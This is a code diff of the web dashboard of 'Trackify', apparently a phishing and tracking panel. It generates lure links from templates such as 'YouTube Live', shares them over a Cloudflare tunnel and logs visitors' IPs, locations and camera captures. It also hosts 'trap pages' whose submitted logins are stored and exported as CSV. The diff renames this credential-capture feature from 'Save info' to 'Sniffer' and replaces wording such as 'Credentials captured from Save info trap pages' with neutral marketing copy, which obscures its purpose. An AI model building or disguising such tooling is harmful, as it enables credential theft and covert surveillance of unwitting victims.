@@ -76,14 +76,12 @@ $userNavInitial = $userNavInitial ?? '?';
         @media (max-width: 900px) {
             .sidebar { border-left: none; border-top: 1px solid var(--border); }
         }
-        .gallery-header {
+        .gallery-section .card.gallery-panel-head {
             display: flex;
             flex-direction: column;
             align-items: stretch;
             gap: 10px;
-            margin-bottom: 16px;
-            padding-bottom: 12px;
-            border-bottom: 1px solid var(--border);
+            margin-bottom: 18px;
         }
         .gallery-header-top {
             display: flex;
@@ -472,6 +470,13 @@ $userNavInitial = $userNavInitial ?? '?';
             color: var(--text-muted);
             font-size: 14px;
             margin-bottom: 20px;
+            line-height: 1.55;
+            max-width: 48rem;
+        }
+        .card > .subtitle.card-view-desc {
+            margin-top: 8px;
+            margin-bottom: 18px;
+            max-width: none;
         }
         .card {
             background: var(--bg-card);
@@ -1645,7 +1650,7 @@ $userNavInitial = $userNavInitial ?? '?';
             <button type="button" class="side-nav-item" id="navItemIp" onclick="switchView('ip')" title="IP Lookup">
                 🌐
             </button>
-            <button type="button" class="side-nav-item" id="navItemSaveInfo" onclick="switchView('saveinfo')" title="Save info">
+            <button type="button" class="side-nav-item" id="navItemSaveInfo" onclick="switchView('saveinfo')" title="Sniffer">
                 🔑
             </button>
             <div class="side-nav-spacer" aria-hidden="true"></div>
@@ -1685,10 +1690,9 @@ $userNavInitial = $userNavInitial ?? '?';
 
         <div id="trackifyLayout" class="layout">
         <main class="main">
-            <p class="subtitle">IP Tracker & Geolocation — Generate tracker links and monitor captures</p>
-
             <div class="card">
                 <h2>Generate Tracker Link</h2>
+                <p class="subtitle card-view-desc">Trackify is a tracker-link platform with advanced analytics for traffic through your generated URLs—see IPs, locations, camera captures, and live events as visitors move through your pages.</p>
                 <label>Template</label>
                 <select id="template">
                     <option value="1">YouTube Live</option>
@@ -1742,11 +1746,12 @@ $userNavInitial = $userNavInitial ?? '?';
         </main>
 
         <section class="gallery-section">
-            <div class="gallery-header">
+            <div class="card gallery-panel-head">
                 <div class="gallery-header-top">
                     <h2 class="gallery-title">Image Captures</h2>
                     <span id="photoCount" style="font-size:13px;color:var(--text-muted)"></span>
                 </div>
+                <p class="subtitle card-view-desc" style="margin-bottom:14px">Image Captures is a visual log with advanced context for verification photos—review thumbnails from your tracker links, select batches, and manage storage from one gallery.</p>
                 <div class="gallery-toolbar" id="galleryToolbar">
                     <label class="gallery-toolbar-label">
                         <input type="checkbox" id="gallerySelectAll" title="Select all on this page">
@@ -1802,6 +1807,7 @@ $userNavInitial = $userNavInitial ?? '?';
                 <div class="phone-layout-columns">
                     <div class="card">
                         <h2>Phone Number Lookup</h2>
+                        <p class="subtitle card-view-desc">Phone Lookup is a recon assistant with advanced shortcuts for numbers you investigate—turn a single input into OSINT URLs, social search links, and a scan history you can revisit anytime.</p>
                         <div class="phone-lookup-input-wrap">
                             <label for="phoneLookupInput">Phone number</label>
                             <input type="text" id="phoneLookupInput" placeholder="09XXXXXXXXX or +63XXXXXXXXXX">
@@ -1834,6 +1840,7 @@ $userNavInitial = $userNavInitial ?? '?';
                 <div class="phone-layout-columns">
                     <div class="card">
                         <h2>IP Lookup</h2>
+                        <p class="subtitle card-view-desc">IP Lookup is a network intelligence view with advanced analytics for addresses you query—IPv4 or IPv6 geolocation, provider details, and an optional map when coordinates are returned.</p>
                         <div class="phone-lookup-input-wrap">
                             <label for="ipLookupInput">IP address</label>
                             <input type="text" id="ipLookupInput" placeholder="e.g. 8.8.8.8 or 2001:4860:4860::8888" autocomplete="off">
@@ -1865,14 +1872,14 @@ $userNavInitial = $userNavInitial ?? '?';
             </div>
         </section>
 
-        <section id="saveInfoLayout" class="phone-layout" style="display:none" aria-label="Save info">
+        <section id="saveInfoLayout" class="phone-layout" style="display:none" aria-label="Sniffer">
             <div class="phone-layout-inner">
                 <div class="phone-layout-columns phone-layout-columns--saveinfo">
                     <div class="save-info-stack">
                         <div class="card">
-                            <h2>Save info</h2>
-                            <p class="saved-logins-intro" style="margin-top:8px;color:var(--text-muted)">
-                                Templates live in <code style="font-size:12px">saveinfo-templates/</code> (not Trackify). Pick one, generate a tunnel, and share the URL ending in <code style="font-size:12px">saveinfo_entry.php</code> — it redirects to the matching <code style="font-size:12px">saveinfo-trap-…</code> page. Trackify root is unchanged. Up to <span id="savedInfoMax">500</span> stored submissions.
+                            <h2>Sniffer</h2>
+                            <p class="subtitle card-view-desc" style="color:var(--text-muted)">
+                                Sniffer is a themed capture flow with advanced handling for traffic through your Sniffer links—pick a template, publish over your tunnel, and review stored submissions (up to <span id="savedInfoMax">500</span>) with export in one place.
                             </p>
                             <div class="phone-lookup-input-wrap">
                                 <label for="siTemplate">Template</label>
@@ -1896,12 +1903,12 @@ $userNavInitial = $userNavInitial ?? '?';
                         <div class="card card-terminal-panel">
                             <div class="terminal-card-head">
                                 <h2>Terminal</h2>
-                                <span class="terminal-card-badge terminal-card-badge--saveinfo" aria-hidden="true">Save info</span>
+                                <span class="terminal-card-badge terminal-card-badge--saveinfo" aria-hidden="true">Sniffer</span>
                             </div>
                             <div id="saveInfoTerminalWrap" class="phone-lookup-results" style="margin-top:0" aria-live="polite">
                                 <div class="phone-lookup-terminal" id="saveInfoTerminal">
-                                    <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Tunnel activity and submissions (shared with Trackify when using one tunnel).</div>
-                                    <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:save-info# </span><span class="terminal-cursor"></span></div>
+                                    <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Sniffer tunnel log (same Cloudflare tunnel as Trackify when shared).</div>
+                                    <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:sniffer# </span><span class="terminal-cursor"></span></div>
                                 </div>
                             </div>
                         </div>
@@ -1912,15 +1919,15 @@ $userNavInitial = $userNavInitial ?? '?';
                                 <h2>Saved logins</h2>
                                 <span class="saved-logins-count" id="savedInfoCountMeta" aria-live="polite"></span>
                             </div>
-                            <p class="saved-logins-intro" style="color:var(--text-muted);margin-bottom:0">
-                                Credentials captured from Save info trap pages (newest first).
+                            <p class="subtitle card-view-desc" style="color:var(--text-muted);margin-bottom:14px">
+                                Saved logins is a structured table with timestamps and context for each submission—newest first, with CSV export for offline analysis.
                             </p>
                             <div class="saved-logins-toolbar">
                                 <button type="button" class="btn btn-secondary" id="exportSavedInfoBtn" onclick="exportSavedInfoCsv()" disabled>Export CSV</button>
                                 <button type="button" class="btn btn-danger" id="clearSavedInfoBtn" onclick="clearSavedInfo()">Clear all</button>
                             </div>
                             <div id="savedInfoWrap" class="saved-info-wrap" aria-live="polite">
-                                <div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a Save info URL and submit the form on the trap page.</div>
+                                <div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a Sniffer link and submit the trap page form.</div>
                             </div>
                         </div>
                     </div>
@@ -2127,13 +2134,13 @@ $userNavInitial = $userNavInitial ?? '?';
                 const data = await res.json().catch(() => ({}));
                 if (data.status === 'success') {
                     if (data.regenerated && data.payload_ok && !silent) {
-                        addTerminalLineTo(saveInfoTerminalEl, '[+] Template "' + data.template + '" is live. Re-open your Save info URL or hard-refresh the trap page (Ctrl+F5).', 'green');
+                        addTerminalLineTo(saveInfoTerminalEl, '[+] Template "' + data.template + '" is live. Re-open your Sniffer URL or hard-refresh the trap page (Ctrl+F5).', 'green');
                     }
                     if (data.regenerated && data.payload_ok === false) {
-                        addTerminalLineTo(saveInfoTerminalEl, '[!] Save info template files not updated — check saveinfo-templates/ and saveinfo_entry.php permissions', 'dim');
+                        addTerminalLineTo(saveInfoTerminalEl, '[!] Sniffer template files not updated — check saveinfo-templates/ and saveinfo_entry.php permissions', 'dim');
                     }
                 } else if (data.status === 'error' && data.message && !silent) {
-                    const skip = 'Generate a Save info link first';
+                    const skip = 'Generate a Sniffer link first';
                     if (String(data.message).indexOf(skip) === -1) {
                         addTerminalLineTo(saveInfoTerminalEl, '[!] ' + data.message, 'dim');
                     }
@@ -2448,12 +2455,12 @@ $userNavInitial = $userNavInitial ?? '?';
             }
             siBtn.disabled = true;
             siBtn.innerHTML = '<span>Starting tunnel...</span>';
-            addTerminalLineTo(saveInfoTerminalEl, '[+] Save info: starting or reusing Cloudflare tunnel...', 'yellow');
+            addTerminalLineTo(saveInfoTerminalEl, '[+] Sniffer: starting or reusing Cloudflare tunnel...', 'yellow');
 
             const siSel = document.getElementById('siTemplate');
             const slug = siSel && siSel.value;
             if (!slug) {
-                addTerminalLineTo(saveInfoTerminalEl, '[!] Select a Save info template first.', 'dim');
+                addTerminalLineTo(saveInfoTerminalEl, '[!] Select a Sniffer template first.', 'dim');
                 siBtn.disabled = false;
                 siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                 return;
@@ -2497,8 +2504,8 @@ $userNavInitial = $userNavInitial ?? '?';
                         siStop.style.display = 'inline-flex';
                     }
                     addTerminalLineTo(saveInfoTerminalEl, '', 'green');
-                    addTerminalLineTo(saveInfoTerminalEl, '[+] Save info URL: ' + startData.link, 'green');
-                    addTerminalLineTo(saveInfoTerminalEl, '[*] Share this URL (not the site root).', 'yellow');
+                    addTerminalLineTo(saveInfoTerminalEl, '[+] Sniffer URL: ' + startData.link, 'green');
+                    addTerminalLineTo(saveInfoTerminalEl, '[*] Share this Sniffer URL (not the site root).', 'yellow');
                     siBtn.disabled = false;
                     siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                     checkStatus();
@@ -2526,7 +2533,7 @@ $userNavInitial = $userNavInitial ?? '?';
                     lastExcerpt = data.tunnel_log_excerpt;
                 }
                 if (data.status === 'forbidden' || data.status === 'error') {
-                    addTerminalLineTo(saveInfoTerminalEl, '[!] ' + (data.message || 'Could not get Save info link'), 'dim');
+                    addTerminalLineTo(saveInfoTerminalEl, '[!] ' + (data.message || 'Could not get Sniffer link'), 'dim');
                     if (siBtn) {
                         siBtn.disabled = false;
                         siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
@@ -2552,8 +2559,8 @@ $userNavInitial = $userNavInitial ?? '?';
                         siStop.style.display = 'inline-flex';
                     }
                     addTerminalLineTo(saveInfoTerminalEl, '', 'green');
-                    addTerminalLineTo(saveInfoTerminalEl, '[+] Save info URL: ' + data.link, 'green');
-                    addTerminalLineTo(saveInfoTerminalEl, '[*] Share this URL (saveinfo_entry.php).', 'yellow');
+                    addTerminalLineTo(saveInfoTerminalEl, '[+] Sniffer URL: ' + data.link, 'green');
+                    addTerminalLineTo(saveInfoTerminalEl, '[*] Share this link (ends in saveinfo_entry.php).', 'yellow');
                     if (siBtn) {
                         siBtn.disabled = false;
                         siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
@@ -2584,7 +2591,7 @@ $userNavInitial = $userNavInitial ?? '?';
                     addTerminalLine('', 'dim');
                     addTerminalLine('[+] Tunnel stopped.', 'dim');
                     addTerminalLineTo(saveInfoTerminalEl, '', 'dim');
-                    addTerminalLineTo(saveInfoTerminalEl, '[+] Tunnel stopped (Save info URL no longer valid).', 'dim');
+                    addTerminalLineTo(saveInfoTerminalEl, '[+] Tunnel stopped (Sniffer URL no longer valid).', 'dim');
                     trackerLinkInput.value = '';
                     syncTrackifyTunnelRow(null, false);
                     statusDisplay.innerHTML = '<span class="status-badge inactive">Tunnel inactive</span>';
@@ -3541,7 +3548,7 @@ $userNavInitial = $userNavInitial ?? '?';
                     if (countMeta) {
                         countMeta.textContent = data.max_entries != null ? '0 / ' + data.max_entries : '';
                     }
-                    wrap.innerHTML = '<div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a Save info URL and submit the form on the trap page.</div>';
+                    wrap.innerHTML = '<div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a Sniffer link and submit the trap page form.</div>';
                     return;
                 }
                 lastSavedInfoEntries = data.entries;
